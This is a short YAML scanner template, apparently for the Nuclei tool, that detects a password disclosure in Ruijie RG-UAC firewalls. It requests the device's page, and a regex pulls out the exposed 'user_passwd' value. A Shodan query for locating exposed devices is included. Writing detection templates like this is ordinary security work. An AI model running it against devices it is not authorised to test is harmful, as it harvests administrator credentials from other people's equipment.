id: ruijie-password-leak
info:
  author: ritikchaddha
  description: Security Notice of Information Disclosure Vulnerability in Multiple
    Firewall Devices
  metadata:
    shodan-query: http.html:"Get_Verify_Info"
  name: RG-UAC Ruijie Password Leak
  reference:
  - https://forum.butian.net/share/177
  severity: high
  tags: password,leak,ruijie,exposure,firewall,router
requests:
- extractors:
  - group: 1
    part: body
    regex:
    - user_passwd\/\*"([a-z0-9]+)"\*\/\);
    type: regex
  matchers:
  - regex:
    - user_passwd\/\*"([a-z0-9]+)"\*\/\);
    type: regex
  - status:
    - 200
    type: status
  matchers-condition: and
  method: GET
  path:
  - '{{BaseURL}}'
